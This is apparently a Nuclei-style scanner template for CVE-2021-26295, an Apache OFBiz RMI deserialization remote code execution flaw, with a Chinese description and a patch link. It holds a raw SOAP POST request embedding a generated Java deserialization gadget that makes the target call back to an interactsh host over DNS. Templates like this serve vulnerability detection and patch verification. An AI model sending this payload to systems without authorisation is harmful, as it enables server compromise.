config/51pwn/yaml/ofbiz/CVE-2021-26295.yaml

id: CVE-2021-26295
info:
  name: Apache OFBiz <17.12.06 - Arbitrary Code Execution
  author:
  - l0ne1y
  description: |-
    Apache OFBiz RMI反序列化任意代码执行漏洞
    Apache OFBiz是一个电子商务平台，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。2021年3月22日 Apache OFBiz官方发布安全更新，修复了一处由RMI反序列化造成的远程代码执行漏洞（CVE-2021-26295）。攻击者可构造恶意请求，触发反序列化，从而造成任意代码执行，控制服务器。阿里云应急响应中心提醒 Apache OFBiz 用户尽快采取安全措施阻止漏洞攻击。
  severity: critical
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://lists.apache.org/thread.html/r3c1802eaf34aa78a61b4e8e044c214bc94accbd28a11f3a276586a31%40%3Cuser.ofbiz.apache.org%3E
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: word
    condition: and
    part: body
    words:
    - errorMessage
  - type: word
    part: header
    words:
    - OFBiz.Visitor=
  matchers-condition: and
  raw:
  - |
    POST /webtools/control/SOAPService HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/xml

    <?xml version='1.0' encoding='UTF-8'?>
    <soapenv:Envelope
      xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header/>
        <soapenv:Body>
          <ns1:clearAllEntityCaches xmlns:ns1="http://ofbiz.apache.org/service/">
              <ns1:cus-obj>{{generate_java_gadget("dns", "https://{{interactsh-url}}", "hex")}}</ns1:cus-obj>
          </ns1:clearAllEntityCaches>
        </soapenv:Body>
    </soapenv:Envelope>
